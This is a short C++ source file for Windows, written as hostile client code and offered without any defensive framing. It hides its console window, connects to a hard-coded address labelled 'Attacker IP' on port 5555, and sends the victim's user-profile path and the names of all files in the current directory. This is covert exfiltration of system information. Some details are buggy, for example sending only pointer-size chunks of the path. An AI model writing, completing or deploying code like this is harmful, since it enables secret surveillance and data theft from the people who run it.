#include <dirent.h> // directory header
#include <iostream> // input/output stream
#include <winsock2.h> // For transferring data

using std::cout;
using std::cin;
using std::endl;

char* userDirectory()   									//To get the path of the directory
{
    char* Path;
    Path = getenv ("USERPROFILE"); 
    if (Path!=NULL)
    {
        return Path; 
    } else { 
        perror(""); 
    }
}

int main () {

    ShowWindow(GetConsoleWindow(), SW_HIDE); 
    WSADATA WSAData; 
    SOCKET server; 
    SOCKADDR_IN addr; 

    WSAStartup(MAKEWORD(2, 0), &WSAData); 
    server = socket(AF_INET, SOCK_STREAM, 0);
    addr.sin_addr.s_addr = inet_addr("172.16.160.10");       //Attacker IP
    addr.sin_family = AF_INET;
    addr.sin_port = htons(5555); 							//Attacker Port
    connect(server, (SOCKADDR *)&addr, sizeof(addr));
	
	char* Path = userDirectory(); 
    send(server, Path, sizeof(Path), 0);
	
	
	DIR *currentDir = NULL;                                   // initializing pointer to null
    currentDir = opendir ("."); 							  //Opening the current working directory
    struct dirent *readcurrent = NULL;

    
    if (currentDir == NULL) 
    { 
        cout << "\nERROR! pdir could not be initialised correctly";
        exit (3);
    } 

    while (readcurrent = readdir (currentDir)) 
    {
        if (readcurrent == NULL) 
        {
            cout << "\nERROR! pent could not be initialised correctly";
            exit (3);
        }
        
        send(server, readcurrent->d_name, sizeof(readcurrent->d_name), 0);
    }

  
    closedir (currentDir);

    cin.get (); 
    return 1 ;
}
